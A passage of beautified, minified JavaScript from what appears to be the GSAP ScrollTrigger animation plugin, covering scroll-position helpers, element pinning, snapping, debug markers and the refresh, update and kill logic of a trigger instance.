              ? X(t)
              : function () {
                  return oe;
                };
          },
          q = function (t, e) {
            var i = e.s,
              n = e.d2,
              r = e.d,
              o = e.a;
            return (i = "scroll" + n) && (o = N(t, i))
              ? o() - X(t)()[r]
              : Y(t)
              ? Math.max(a[i], l[i]) -
                (s["inner" + n] || a["client" + n] || l["client" + n])
              : t[i] - t["offset" + n];
          },
          V = function (t, e) {
            for (var i = 0; i < T.length; i += 3)
              (!e || ~e.indexOf(T[i + 1])) && t(T[i], T[i + 1], T[i + 2]);
          },
          G = function (t) {
            return "string" == typeof t;
          },
          K = function (t) {
            return "function" == typeof t;
          },
          Q = function (t) {
            return "number" == typeof t;
          },
          Z = function (t) {
            return "object" == typeof t;
          },
          $ = function (t) {
            return K(t) && t();
          },
          J = function (t, e) {
            return function () {
              var i = $(t),
                n = $(e);
              return function () {
                $(i), $(n);
              };
            };
          },
          tt = Math.abs,
          et = "scrollLeft",
          it = "scrollTop",
          nt = "left",
          rt = "top",
          st = "right",
          ot = "bottom",
          at = "width",
          lt = "height",
          ct = "Right",
          ut = "Left",
          ht = "Top",
          ft = "Bottom",
          dt = "padding",
          pt = "margin",
          mt = "Width",
          gt = "Height",
          vt = "px",
          _t = {
            s: et,
            p: nt,
            p2: ut,
            os: st,
            os2: ct,
            d: at,
            d2: mt,
            a: "x",
            sc: function (t) {
              return arguments.length
                ? s.scrollTo(t, yt.sc())
                : s.pageXOffset || o[et] || a[et] || l[et] || 0;
            },
          },
          yt = {
            s: it,
            p: rt,
            p2: ht,
            os: ot,
            os2: ft,
            d: lt,
            d2: gt,
            a: "y",
            op: _t,
            sc: function (t) {
              return arguments.length
                ? s.scrollTo(_t.sc(), t)
                : s.pageYOffset || o[it] || a[it] || l[it] || 0;
            },
          },
          bt = function (t) {
            return s.getComputedStyle(t);
          },
          wt = function (t, e) {
            for (var i in e) i in t || (t[i] = e[i]);
            return t;
          },
          xt = function (t, e) {
            var i =
                e &&
                "matrix(1, 0, 0, 1, 0, 0)" !== bt(t)[y] &&
                n
                  .to(t, {
                    x: 0,
                    y: 0,
                    xPercent: 0,
                    yPercent: 0,
                    rotation: 0,
                    rotationX: 0,
                    rotationY: 0,
                    scale: 1,
                    skewX: 0,
                    skewY: 0,
                  })
                  .progress(1),
              r = t.getBoundingClientRect();
            return i && i.progress(0).kill(), r;
          },
          Tt = function (t, e) {
            var i = e.d2;
            return t["offset" + i] || t["client" + i] || 0;
          },
          St = function (t) {
            var e,
              i = [],
              n = t.labels,
              r = t.duration();
            for (e in n) i.push(n[e] / r);
            return i;
          },
          kt = function (t) {
            return function (e) {
              return n.utils.snap(St(t), e);
            };
          },
          Ot = function (t) {
            return function (e, i) {
              var n,
                r = St(t);
              if (
                (r.sort(function (t, e) {
                  return t - e;
                }),
                i.direction > 0)
              ) {
                for (e -= 1e-4, n = 0; n < r.length; n++)
                  if (r[n] >= e) return r[n];
                return r.pop();
              }
              for (n = r.length, e += 1e-4; n--; ) if (r[n] <= e) return r[n];
              return r[0];
            };
          },
          Et = function (t, e, i, n) {
            return i.split(",").forEach(function (i) {
              return t(e, i, n);
            });
          },
          At = function (t, e, i) {
            return t.addEventListener(e, i, { passive: !0 });
          },
          Pt = function (t, e, i) {
            return t.removeEventListener(e, i);
          },
          Ct = {
            startColor: "green",
            endColor: "red",
            indent: 0,
            fontSize: "16px",
            fontWeight: "normal",
          },
          Mt = { toggleActions: "play", anticipatePin: 0 },
          jt = { top: 0, left: 0, center: 0.5, bottom: 1, right: 1 },
          Dt = function (t, e) {
            if (G(t)) {
              var i = t.indexOf("="),
                n = ~i
                  ? +(t.charAt(i - 1) + 1) * parseFloat(t.substr(i + 1))
                  : 0;
              ~i &&
                (t.indexOf("%") > i && (n *= e / 100),
                (t = t.substr(0, i - 1))),
                (t =
                  n +
                  (t in jt
                    ? jt[t] * e
                    : ~t.indexOf("%")
                    ? (parseFloat(t) * e) / 100
                    : parseFloat(t) || 0));
            }
            return t;
          },
          Lt = function (t, e, i, n, r, s, a) {
            var c = r.startColor,
              u = r.endColor,
              h = r.fontSize,
              f = r.indent,
              d = r.fontWeight,
              p = o.createElement("div"),
              m = Y(i) || "fixed" === N(i, "pinType"),
              g = -1 !== t.indexOf("scroller"),
              v = m ? l : i,
              _ = -1 !== t.indexOf("start"),
              y = _ ? c : u,
              b =
                "border-color:" +
                y +
                ";font-size:" +
                h +
                ";color:" +
                y +
                ";font-weight:" +
                d +
                ";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";
            return (
              (b += "position:" + (g && m ? "fixed;" : "absolute;")),
              (g || !m) &&
                (b += (n === yt ? st : ot) + ":" + (s + parseFloat(f)) + "px;"),
              a &&
                (b +=
                  "box-sizing:border-box;text-align:left;width:" +
                  a.offsetWidth +
                  "px;"),
              (p._isStart = _),
              p.setAttribute("class", "gsap-marker-" + t),
              (p.style.cssText = b),
              (p.innerText = e || 0 === e ? t + "-" + e : t),
              v.children[0]
                ? v.insertBefore(p, v.children[0])
                : v.appendChild(p),
              (p._offset = p["offset" + n.op.d2]),
              Bt(p, 0, n, _),
              p
            );
          },
          Bt = function (t, e, i, r) {
            var s = { display: "block" },
              o = i[r ? "os2" : "p2"],
              a = i[r ? "p2" : "os2"];
            (t._isFlipped = r),
              (s[i.a + "Percent"] = r ? -100 : 0),
              (s[i.a] = r ? "1px" : 0),
              (s["border" + o + mt] = 1),
              (s["border" + a + mt] = 0),
              (s[i.p] = e + "px"),
              n.set(t, s);
          },
          Rt = [],
          It = {},
          zt = function () {
            return f || (f = h(Jt));
          },
          Ft = function () {
            f || ((f = h(Jt)), B || qt("scrollStart"), (B = D()));
          },
          Wt = function () {
            return !v && !O && !o.fullscreenElement && u.restart(!0);
          },
          Yt = {},
          Nt = [],
          Ht = [],
          Xt = function (t) {
            var e,
              i = n.ticker.frame,
              o = [],
              a = 0;
            if (P !== i || C) {
              for (Kt(); a < Ht.length; a += 4)
                (e = s.matchMedia(Ht[a]).matches) !== Ht[a + 3] &&
                  ((Ht[a + 3] = e),
                  e
                    ? o.push(a)
                    : Kt(1, Ht[a]) || (K(Ht[a + 2]) && Ht[a + 2]()));
              for (Gt(), a = 0; a < o.length; a++)
                (e = o[a]), (A = Ht[e]), (Ht[e + 2] = Ht[e + 1](t));
              (A = 0), r && Qt(0, 1), (P = i), qt("matchMedia");
            }
          },
          Ut = function t() {
            return Pt(he, "scrollEnd", t) || Qt(!0);
          },
          qt = function (t) {
            return (
              (Yt[t] &&
                Yt[t].map(function (t) {
                  return t();
                })) ||
              Nt
            );
          },
          Vt = [],
          Gt = function (t) {
            for (var e = 0; e < Vt.length; e += 5)
              (t && Vt[e + 4] !== t) ||
                ((Vt[e].style.cssText = Vt[e + 1]),
                Vt[e].getBBox &&
                  Vt[e].setAttribute("transform", Vt[e + 2] || ""),
                (Vt[e + 3].uncache = 1));
          },
          Kt = function (t, e) {
            var i;
            for (b = 0; b < Rt.length; b++)
              (i = Rt[b]), (e && i.media !== e) || (t ? i.kill(1) : i.revert());
            e && Gt(e), e || qt("revert");
          },
          Qt = function (t, e) {
            if (!B || t) {
              var i = qt("refreshInit");
              S && he.sort(),
                e || Kt(),
                Rt.forEach(function (t) {
                  return t.refresh();
                }),
                i.forEach(function (t) {
                  return t && t.render && t.render(-1);
                }),
                j.forEach(function (t) {
                  return "function" == typeof t && (t.rec = 0);
                }),
                u.pause(),
                qt("refresh");
            } else At(he, "scrollEnd", Ut);
          },
          Zt = 0,
          $t = 1,
          Jt = function () {
            var t = Rt.length,
              e = D(),
              i = e - L >= 50,
              n = t && Rt[0].scroll();
            if (
              (($t = Zt > n ? -1 : 1),
              (Zt = n),
              i &&
                (B && !_ && e - B > 200 && ((B = 0), qt("scrollEnd")),
                (m = L),
                (L = e)),
              $t < 0)
            ) {
              for (b = t; b-- > 0; ) Rt[b] && Rt[b].update(0, i);
              $t = 1;
            } else for (b = 0; b < t; b++) Rt[b] && Rt[b].update(0, i);
            f = 0;
          },
          te = [
            nt,
            rt,
            ot,
            st,
            pt + ft,
            pt + ct,
            pt + ht,
            pt + ut,
            "display",
            "flexShrink",
            "float",
            "zIndex",
            "grid-column-start",
            "grid-column-end",
            "grid-row-start",
            "grid-row-end",
            "grid-area",
            "justify-self",
            "align-self",
            "place-self",
          ],
          ee = te.concat([
            at,
            lt,
            "boxSizing",
            "max" + mt,
            "max" + gt,
            "position",
            pt,
            dt,
            dt + ht,
            dt + ct,
            dt + ft,
            dt + ut,
          ]),
          ie = function (t, e, i, n) {
            if (t.parentNode !== e) {
              for (var r, s = te.length, o = e.style, a = t.style; s--; )
                o[(r = te[s])] = i[r];
              (o.position =
                "absolute" === i.position ? "absolute" : "relative"),
                "inline" === i.display && (o.display = "inline-block"),
                (a[ot] = a[st] = "auto"),
                (o.overflow = "visible"),
                (o.boxSizing = "border-box"),
                (o[at] = Tt(t, _t) + vt),
                (o[lt] = Tt(t, yt) + vt),
                (o[dt] = a[pt] = a.top = a[nt] = "0"),
                re(n),
                (a[at] = a.maxWidth = i[at]),
                (a[lt] = a.maxHeight = i[lt]),
                (a[dt] = i[dt]),
                t.parentNode.insertBefore(e, t),
                e.appendChild(t);
            }
          },
          ne = /([A-Z])/g,
          re = function (t) {
            if (t) {
              var e,
                i,
                r = t.t.style,
                s = t.length,
                o = 0;
              for (
                (t.t._gsap || n.core.getCache(t.t)).uncache = 1;
                o < s;
                o += 2
              )
                (i = t[o + 1]),
                  (e = t[o]),
                  i
                    ? (r[e] = i)
                    : r[e] &&
                      r.removeProperty(e.replace(ne, "-$1").toLowerCase());
            }
          },
          se = function (t) {
            for (var e = ee.length, i = t.style, n = [], r = 0; r < e; r++)
              n.push(ee[r], i[ee[r]]);
            return (n.t = t), n;
          },
          oe = { left: 0, top: 0 },
          ae = function (t, e, i, n, r, s, o, c, u, h, f, p) {
            if (
              (K(t) && (t = t(c)),
              G(t) &&
                "max" === t.substr(0, 3) &&
                (t = p + ("=" === t.charAt(4) ? Dt("0" + t.substr(3), i) : 0)),
              Q(t))
            )
              o && Bt(o, i, n, !0);
            else {
              K(e) && (e = e(c));
              var m,
                g,
                v,
                _ = d(e)[0] || l,
                y = xt(_) || {},
                b = t.split(" ");
              (y && (y.left || y.top)) ||
                "none" !== bt(_).display ||
                ((v = _.style.display),
                (_.style.display = "block"),
                (y = xt(_)),
                v ? (_.style.display = v) : _.style.removeProperty("display")),
                (m = Dt(b[0], y[n.d])),
                (g = Dt(b[1] || "0", i)),
                (t = y[n.p] - u[n.p] - h + m + r - g),
                o && Bt(o, g, n, i - g < 20 || (o._isStart && g > 20)),
                (i -= i - g);
            }
            if (s) {
              var w = t + i,
                x = s._isStart;
              (p = "scroll" + n.d2),
                Bt(
                  s,
                  w,
                  n,
                  (x && w > 20) ||
                    (!x &&
                      (f ? Math.max(l[p], a[p]) : s.parentNode[p]) <= w + 1)
                ),
                f &&
                  ((u = xt(o)),
                  f && (s.style[n.op.p] = u[n.op.p] - n.op.m - s._offset + vt));
            }
            return Math.round(t);
          },
          le = /(?:webkit|moz|length|cssText|inset)/i,
          ce = function (t, e, i, r) {
            if (t.parentNode !== e) {
              var s,
                o,
                a = t.style;
              if (e === l) {
                for (s in ((t._stOrig = a.cssText), (o = bt(t))))
                  +s ||
                    le.test(s) ||
                    !o[s] ||
                    "string" != typeof a[s] ||
                    "0" === s ||
                    (a[s] = o[s]);
                (a.top = i), (a.left = r);
              } else a.cssText = t._stOrig;
              (n.core.getCache(t).uncache = 1), e.appendChild(t);
            }
          },
          ue = function (t, e) {
            var i,
              r,
              s = H(t, e),
              o = "_scroll" + e.p2,
              a = function e(a, l, c, u, h) {
                var f = e.tween,
                  d = l.onComplete,
                  p = {};
                return (
                  f && f.kill(),
                  (i = Math.round(c)),
                  (l[o] = a),
                  (l.modifiers = p),
                  (p[o] = function (t) {
                    return (
                      (t = z(s())) !== i && t !== r && Math.abs(t - i) > 2
                        ? (f.kill(), (e.tween = 0))
                        : (t = c + u * f.ratio + h * f.ratio * f.ratio),
                      (r = i),
                      (i = z(t))
                    );
                  }),
                  (l.onComplete = function () {
                    (e.tween = 0), d && d.call(f);
                  }),
                  (f = e.tween = n.to(t, l))
                );
              };
            return (
              (t[o] = s),
              t.addEventListener("wheel", function () {
                return a.tween && a.tween.kill() && (a.tween = 0);
              }),
              a
            );
          };
        _t.op = yt;
        var he = (function () {
          function t(e, i) {
            r ||
              t.register(n) ||
              console.warn("Please gsap.registerPlugin(ScrollTrigger)"),
              this.init(e, i);
          }
          return (
            (t.prototype.init = function (e, i) {
              if (
                ((this.progress = this.start = 0), this.vars && this.kill(1), R)
              ) {
                var r,
                  c,
                  u,
                  h,
                  f,
                  g,
                  y,
                  w,
                  x,
                  T,
                  O,
                  P,
                  j,
                  L,
                  z,
                  F,
                  W,
                  X,
                  V,
                  $,
                  J,
                  et,
                  it,
                  nt,
                  rt,
                  st,
                  ot,
                  gt,
                  St,
                  Et,
                  jt,
                  Bt,
                  zt,
                  Yt,
                  Nt,
                  Ht,
                  Xt = (e = wt(
                    G(e) || Q(e) || e.nodeType ? { trigger: e } : e,
                    Mt
                  )).horizontal
                    ? _t
                    : yt,
                  qt = e,
                  Vt = qt.onUpdate,
                  Gt = qt.toggleClass,
                  Kt = qt.id,
                  Qt = qt.onToggle,
                  Zt = qt.onRefresh,
                  Jt = qt.scrub,
                  te = qt.trigger,
                  ee = qt.pin,
                  ne = qt.pinSpacing,
                  oe = qt.invalidateOnRefresh,
                  le = qt.anticipatePin,
                  he = qt.onScrubComplete,
                  fe = qt.onSnapComplete,
                  de = qt.once,
                  pe = qt.snap,
                  me = qt.pinReparent,
                  ge = !Jt && 0 !== Jt,
                  ve = d(e.scroller || s)[0],
                  _e = n.core.getCache(ve),
                  ye = Y(ve),
                  be =
                    "pinType" in e
                      ? "fixed" === e.pinType
                      : ye || "fixed" === N(ve, "pinType"),
                  we = [e.onEnter, e.onLeave, e.onEnterBack, e.onLeaveBack],
                  xe = ge && e.toggleActions.split(" "),
                  Te = "markers" in e ? e.markers : Mt.markers,
                  Se = ye ? 0 : parseFloat(bt(ve)["border" + Xt.p2 + mt]) || 0,
                  ke = this,
                  Oe =
                    e.onRefreshInit &&
                    function () {
                      return e.onRefreshInit(ke);
                    },
                  Ee = (function (t, e, i) {
                    var n = i.d,
                      r = i.d2,
                      o = i.a;
                    return (o = N(t, "getBoundingClientRect"))
                      ? function () {
                          return o()[n];
                        }
                      : function () {
                          return (e ? s["inner" + r] : t["client" + r]) || 0;
                        };
                  })(ve, ye, Xt),
                  Ae = U(ve, ye),
                  Pe = 0;
                (ke.media = A),
                  (le *= 45),
                  (ke.scroller = ve),
                  (ke.scroll = H(ve, Xt)),
                  (h = ke.scroll()),
                  (ke.vars = e),
                  (i = i || e.animation),
                  "refreshPriority" in e && (S = 1),
                  (_e.tweenScroll = _e.tweenScroll || {
                    top: ue(ve, yt),
                    left: ue(ve, _t),
                  }),
                  (ke.tweenTo = r = _e.tweenScroll[Xt.p]),
                  i &&
                    ((i.vars.lazy = !1),
                    i._initted ||
                      (!1 !== i.vars.immediateRender &&
                        !1 !== e.immediateRender &&
                        i.render(0, !0, !0)),
                    (ke.animation = i.pause()),
                    (i.scrollTrigger = ke),
                    (jt = Q(Jt) && Jt) &&
                      (Et = n.to(i, {
                        ease: "power3",
                        duration: jt,
                        onComplete: function () {
                          return he && he(ke);
                        },
                      })),
                    (gt = 0),
                    Kt || (Kt = i.vars.id)),
                  Rt.push(ke),
                  pe &&
                    (Z(pe) || (pe = { snapTo: pe }),
                    "scrollBehavior" in l.style &&
                      n.set(ye ? [l, a] : ve, { scrollBehavior: "auto" }),
                    (u = K(pe.snapTo)
                      ? pe.snapTo
                      : "labels" === pe.snapTo
                      ? kt(i)
                      : "labelsDirectional" === pe.snapTo
                      ? Ot(i)
                      : n.utils.snap(pe.snapTo)),
                    (Bt = pe.duration || { min: 0.1, max: 2 }),
                    (Bt = Z(Bt) ? p(Bt.min, Bt.max) : p(Bt, Bt)),
                    (zt = n
                      .delayedCall(pe.delay || jt / 2 || 0.1, function () {
                        if (
                          Math.abs(ke.getVelocity()) < 10 &&
                          !_ &&
                          Pe !== ke.scroll()
                        ) {
                          var t = i && !ge ? i.totalProgress() : ke.progress,
                            e = ((t - St) / (D() - m)) * 1e3 || 0,
                            s = n.utils.clamp(
                              -ke.progress,
                              1 - ke.progress,
                              (tt(e / 2) * e) / 0.185
                            ),
                            o = ke.progress + (!1 === pe.inertia ? 0 : s),
                            a = p(0, 1, u(o, ke)),
                            l = ke.scroll(),
                            c = Math.round(g + a * j),
                            h = pe,
                            f = h.onStart,
                            d = h.onInterrupt,
                            v = h.onComplete,
                            b = r.tween;
                          if (l <= y && l >= g && c !== l) {
                            if (b && !b._initted && b.data <= Math.abs(c - l))
                              return;
                            !1 === pe.inertia && (s = a - ke.progress),
                              r(
                                c,
                                {
                                  duration: Bt(
                                    tt(
                                      (0.185 * Math.max(tt(o - t), tt(a - t))) /
                                        e /
                                        0.05 || 0
                                    )
                                  ),
                                  ease: pe.ease || "power3",
                                  data: Math.abs(c - l),
                                  onInterrupt: function () {
                                    return zt.restart(!0) && d && d(ke);
                                  },
                                  onComplete: function () {
                                    (Pe = ke.scroll()),
                                      (gt = St =
                                        i && !ge
                                          ? i.totalProgress()
                                          : ke.progress),
                                      fe && fe(ke),
                                      v && v(ke);
                                  },
                                },
                                l,
                                s * j,
                                c - l - s * j
                              ),
                              f && f(ke, r.tween);
                          }
                        } else ke.isActive && zt.restart(!0);
                      })
                      .pause())),
                  Kt && (It[Kt] = ke),
                  (te = ke.trigger = d(te || ee)[0]),
                  (ee = !0 === ee ? te : d(ee)[0]),
                  G(Gt) && (Gt = { targets: te, className: Gt }),
                  ee &&
                    (!1 === ne ||
                      ne === pt ||
                      (ne =
                        !(!ne && "flex" === bt(ee.parentNode).display) && dt),
                    (ke.pin = ee),
                    !1 !== e.force3D && n.set(ee, { force3D: !0 }),
                    (c = n.core.getCache(ee)).spacer
                      ? (L = c.pinState)
                      : ((c.spacer = W = o.createElement("div")),
                        W.setAttribute(
                          "class",
                          "pin-spacer" + (Kt ? " pin-spacer-" + Kt : "")
                        ),
                        (c.pinState = L = se(ee))),
                    (ke.spacer = W = c.spacer),
                    (ot = bt(ee)),
                    (it = ot[ne + Xt.os2]),
                    (V = n.getProperty(ee)),
                    ($ = n.quickSetter(ee, Xt.a, vt)),
                    ie(ee, W, ot),
                    (F = se(ee))),
                  Te &&
                    ((P = Z(Te) ? wt(Te, Ct) : Ct),
                    (T = Lt("scroller-start", Kt, ve, Xt, P, 0)),
                    (O = Lt("scroller-end", Kt, ve, Xt, P, 0, T)),
                    (X = T["offset" + Xt.op.d2]),
                    (w = Lt("start", Kt, ve, Xt, P, X)),
                    (x = Lt("end", Kt, ve, Xt, P, X)),
                    be ||
                      (M.length && !0 === N(ve, "fixedMarkers")) ||
                      ((function (t) {
                        var e = bt(t).position;
                        t.style.position =
                          "absolute" === e || "fixed" === e ? e : "relative";
                      })(ye ? l : ve),
                      n.set([T, O], { force3D: !0 }),
                      (rt = n.quickSetter(T, Xt.a, vt)),
                      (st = n.quickSetter(O, Xt.a, vt)))),
                  (ke.revert = function (t) {
                    var e = !1 !== t || !ke.enabled,
                      n = v;
                    e !== ke.isReverted &&
                      (e &&
                        (ke.scroll.rec || (ke.scroll.rec = ke.scroll()),
                        (Nt = Math.max(ke.scroll(), ke.scroll.rec || 0)),
                        (Yt = ke.progress),
                        (Ht = i && i.progress())),
                      w &&
                        [w, x, T, O].forEach(function (t) {
                          return (t.style.display = e ? "none" : "block");
                        }),
                      e && (v = 1),
                      ke.update(e),
                      (v = n),
                      ee &&
                        (e
                          ? (function (t, e, i) {
                              if ((re(i), t.parentNode === e)) {
                                var n = e.parentNode;
                                n && (n.insertBefore(t, e), n.removeChild(e));
                              }
                            })(ee, W, L)
                          : (!me || !ke.isActive) && ie(ee, W, bt(ee), nt)),
                      (ke.isReverted = e));
                  }),
                  (ke.refresh = function (r, s) {
                    if ((!v && ke.enabled) || s)
                      if (ee && r && B) At(t, "scrollEnd", Ut);
                      else {
                        (v = 1),
                          Et && Et.pause(),
                          oe && i && i.progress(0).invalidate(),
                          ke.isReverted || ke.revert();
                        for (
                          var o,
                            a,
                            c,
                            u,
                            p,
                            m,
                            _,
                            b,
                            S,
                            E,
                            A = Ee(),
                            P = Ae(),
                            C = q(ve, Xt),
                            M = 0,
                            D = 0,
                            R = e.end,
                            I = e.endTrigger || te,
                            Y =
                              e.start ||
                              (0 !== e.start && te
                                ? ee
                                  ? "0 0"
                                  : "0 100%"
                                : 0),
                            N = e.pinnedContainer && d(e.pinnedContainer)[0],
                            X = (te && Math.max(0, Rt.indexOf(ke))) || 0,
                            U = X;
                          U--;

                        )
                          (m = Rt[U]).end || m.refresh(0, 1) || (v = 1),
                            !(_ = m.pin) ||
                              (_ !== te && _ !== ee) ||
                              m.isReverted ||
                              (E || (E = []), E.unshift(m), m.revert());
                        for (
                          g =
                            ae(
                              Y,
                              te,
                              A,
                              Xt,
                              ke.scroll(),
                              w,
                              T,
                              ke,
                              P,
                              Se,
                              be,
                              C
                            ) || (ee ? -0.001 : 0),
                            K(R) && (R = R(ke)),
                            G(R) &&
                              !R.indexOf("+=") &&
                              (~R.indexOf(" ")
                                ? (R = (G(Y) ? Y.split(" ")[0] : "") + R)
                                : ((M = Dt(R.substr(2), A)),
                                  (R = G(Y) ? Y : g + M),
                                  (I = te))),
                            y =
                              Math.max(
                                g,
                                ae(
                                  R || (I ? "100% 0" : C),
                                  I,
                                  A,
                                  Xt,
                                  ke.scroll() + M,
                                  x,
                                  O,
                                  ke,
                                  P,
                                  Se,
                                  be,
                                  C
                                )
                              ) || -0.001,
                            j = y - g || ((g -= 0.01) && 0.001),
                            M = 0,
                            U = X;
                          U--;

                        )
                          (_ = (m = Rt[U]).pin) &&
                            m.start - m._pinPush < g &&
                            ((o = m.end - m.start),
                            (_ === te || _ === N) && (M += o),
                            _ === ee && (D += o));
                        if (
                          ((g += M),
                          (y += M),
                          (ke._pinPush = D),
                          w &&
                            M &&
                            (((o = {})[Xt.a] = "+=" + M),
                            N && (o[Xt.p] = "-=" + ke.scroll()),
                            n.set([w, x], o)),
                          ee)
                        )
                          (o = bt(ee)),
                            (u = Xt === yt),
                            (c = ke.scroll()),
                            (J = parseFloat(V(Xt.a)) + D),
                            !C &&
                              y > 1 &&
                              ((ye ? l : ve).style["overflow-" + Xt.a] =
                                "scroll"),
                            ie(ee, W, o),
                            (F = se(ee)),
                            (a = xt(ee, !0)),
                            (b = be && H(ve, u ? _t : yt)()),
                            ne &&
                              (((nt = [ne + Xt.os2, j + D + vt]).t = W),
                              (U = ne === dt ? Tt(ee, Xt) + j + D : 0) &&
                                nt.push(Xt.d, U + vt),
                              re(nt),
                              be && ke.scroll(Nt)),
                            be &&
                              (((p = {
                                top: a.top + (u ? c - g : b) + vt,
                                left: a.left + (u ? b : c - g) + vt,
                                boxSizing: "border-box",
                                position: "fixed",
                              })[at] = p.maxWidth =
                                Math.ceil(a.width) + vt),
                              (p[lt] = p.maxHeight = Math.ceil(a.height) + vt),
                              (p[pt] =
                                p[pt + ht] =
                                p[pt + ct] =
                                p[pt + ft] =
                                p[pt + ut] =
                                  "0"),
                              (p[dt] = o[dt]),
                              (p[dt + ht] = o[dt + ht]),
                              (p[dt + ct] = o[dt + ct]),
                              (p[dt + ft] = o[dt + ft]),
                              (p[dt + ut] = o[dt + ut]),
                              (z = (function (t, e, i) {
                                for (
                                  var n, r = [], s = t.length, o = i ? 8 : 0;
                                  o < s;
                                  o += 2
                                )
                                  (n = t[o]),
                                    r.push(n, n in e ? e[n] : t[o + 1]);
                                return (r.t = t.t), r;
                              })(L, p, me))),
                            i
                              ? ((S = i._initted),
                                k(1),
                                i.render(i.duration(), !0, !0),
                                (et = V(Xt.a) - J + j + D),
                                j !== et && z.splice(z.length - 2, 2),
                                i.render(0, !0, !0),
                                S || i.invalidate(),
                                k(0))
                              : (et = j);
                        else if (te && ke.scroll())
                          for (a = te.parentNode; a && a !== l; )
                            a._pinOffset &&
                              ((g -= a._pinOffset), (y -= a._pinOffset)),
                              (a = a.parentNode);
                        E &&
                          E.forEach(function (t) {
                            return t.revert(!1);
                          }),
                          (ke.start = g),
                          (ke.end = y),
                          (h = f = ke.scroll()) < Nt && ke.scroll(Nt),
                          ke.revert(!1),
                          (v = 0),
                          i &&
                            ge &&
                            i._initted &&
                            i.progress() !== Ht &&
                            i.progress(Ht, !0).render(i.time(), !0, !0),
                          Yt !== ke.progress &&
                            (Et && i.totalProgress(Yt, !0),
                            (ke.progress = Yt),
                            ke.update()),
                          ee &&
                            ne &&
                            (W._pinOffset = Math.round(ke.progress * et)),
                          Zt && Zt(ke);
                      }
                  }),
                  (ke.getVelocity = function () {
                    return ((ke.scroll() - f) / (D() - m)) * 1e3 || 0;
                  }),
                  (ke.update = function (t, e) {
                    var n,
                      s,
                      o,
                      a,
                      c,
                      u = ke.scroll(),
                      p = t ? 0 : (u - g) / j,
                      _ = p < 0 ? 0 : p > 1 ? 1 : p || 0,
                      b = ke.progress;
                    if (
                      (e &&
                        ((f = h),
                        (h = u),
                        pe &&
                          ((St = gt), (gt = i && !ge ? i.totalProgress() : _))),
                      le &&
                        !_ &&
                        ee &&
                        !v &&
                        !C &&
                        B &&
                        g < u + ((u - f) / (D() - m)) * le &&
                        (_ = 1e-4),
                      _ !== b && ke.enabled)
                    ) {
                      if (
                        ((a =
                          (c =
                            (n = ke.isActive = !!_ && _ < 1) !=
                            (!!b && b < 1)) || !!_ != !!b),
                        (ke.direction = _ > b ? 1 : -1),
                        (ke.progress = _),
                        ge ||
                          (!Et || v || C
                            ? i && i.totalProgress(_, !!v)
                            : ((Et.vars.totalProgress = _),
                              Et.invalidate().restart())),
                        ee)
                      )
                        if ((t && ne && (W.style[ne + Xt.os2] = it), be)) {
                          if (a) {
                            if (
                              ((o =
                                !t && _ > b && y + 1 > u && u + 1 >= q(ve, Xt)),
                              me)
                            )
                              if (t || (!n && !o)) ce(ee, W);
                              else {
                                var w = xt(ee, !0),
                                  x = u - g;
                                ce(
                                  ee,
                                  l,
                                  w.top + (Xt === yt ? x : 0) + vt,
                                  w.left + (Xt === yt ? 0 : x) + vt
                                );
                              }
                            re(n || o ? z : F),
                              (et !== j && _ < 1 && n) ||
                                $(J + (1 !== _ || o ? 0 : et));
                          }
                        } else $(J + et * _);
                      pe && !r.tween && !v && !C && zt.restart(!0),
                        Gt &&
                          (c || (de && _ && (_ < 1 || !E))) &&
                          d(Gt.targets).forEach(function (t) {
                            return t.classList[n || de ? "add" : "remove"](
                              Gt.className
                            );
                          }),
                        Vt && !ge && !t && Vt(ke),
                        a && !v
                          ? ((s = _ && !b ? 0 : 1 === _ ? 1 : 1 === b ? 2 : 3),
                            ge &&
                              ((o =
                                (!c && "none" !== xe[s + 1] && xe[s + 1]) ||
                                xe[s]),
                              i &&
                                ("complete" === o || "reset" === o || o in i) &&
                                ("complete" === o
                                  ? i.pause().totalProgress(1)
                                  : "reset" === o
                                  ? i.restart(!0).pause()
                                  : "restart" === o
                                  ? i.restart(!0)
                                  : i[o]()),
                              Vt && Vt(ke)),
                            (!c && E) ||
                              (Qt && c && Qt(ke),
                              we[s] && we[s](ke),
                              de && (1 === _ ? ke.kill(!1, 1) : (we[s] = 0)),
                              c || (we[(s = 1 === _ ? 1 : 3)] && we[s](ke))))
                          : ge && Vt && !v && Vt(ke);
                    }
                    st && (rt(u + (T._isFlipped ? 1 : 0)), st(u));
                  }),
                  (ke.enable = function (e, i) {
                    ke.enabled ||
                      ((ke.enabled = !0),
                      At(ve, "resize", Wt),
                      At(ve, "scroll", Ft),
                      Oe && At(t, "refreshInit", Oe),
                      !1 !== e &&
                        ((ke.progress = Yt = 0), (h = f = Pe = ke.scroll())),
                      !1 !== i && ke.refresh());
                  }),
                  (ke.getTween = function (t) {
                    return t && r ? r.tween : Et;
                  }),
                  (ke.disable = function (e, i) {
                    if (
                      ke.enabled &&
                      (!1 !== e && ke.revert(),
                      (ke.enabled = ke.isActive = !1),
                      i || (Et && Et.pause()),
                      (Nt = 0),
                      c && (c.uncache = 1),
                      Oe && Pt(t, "refreshInit", Oe),
                      zt &&
                        (zt.pause(),
                        r.tween && r.tween.kill() && (r.tween = 0)),
                      !ye)
                    ) {
                      for (var n = Rt.length; n--; )
                        if (Rt[n].scroller === ve && Rt[n] !== ke) return;
                      Pt(ve, "resize", Wt), Pt(ve, "scroll", Ft);
                    }
                  }),
                  (ke.kill = function (t, e) {
                    ke.disable(t, e), Kt && delete It[Kt];
                    var n = Rt.indexOf(ke);
                    Rt.splice(n, 1),
                      n === b && $t > 0 && b--,
                      i &&
                        ((i.scrollTrigger = null),
                        t && i.render(-1),
                        e || i.kill()),
                      w &&
                        [w, x, T, O].forEach(function (t) {
                          return t.parentNode && t.parentNode.removeChild(t);
                        }),
                      ee &&
                        (c && (c.uncache = 1),
                        (n = 0),
                        Rt.forEach(function (t) {
                          return t.pin === ee && n++;
                        }),
                        n || (c.spacer = 0));
                  }),
                  ke.enable(!1, !1),
                  i && i.add && !j
                    ? n.delayedCall(0.01, function () {
                        return g || y || ke.refresh();
                      }) &&
                      (j = 0.01) &&
                      (g = y = 0)
                    : ke.refresh();
              } else this.update = this.refresh = this.kill = I;
            }),
            (t.register = function (e) {
              if (
                !r &&
                ((n = e || W()),
                F() &&
                  window.document &&
                  ((s = window),
                  (o = document),
                  (a = o.documentElement),
                  (l = o.body)),
                n &&
                  ((d = n.utils.toArray),
                  (p = n.utils.clamp),
                  (k = n.core.suppressOverwrites || I),
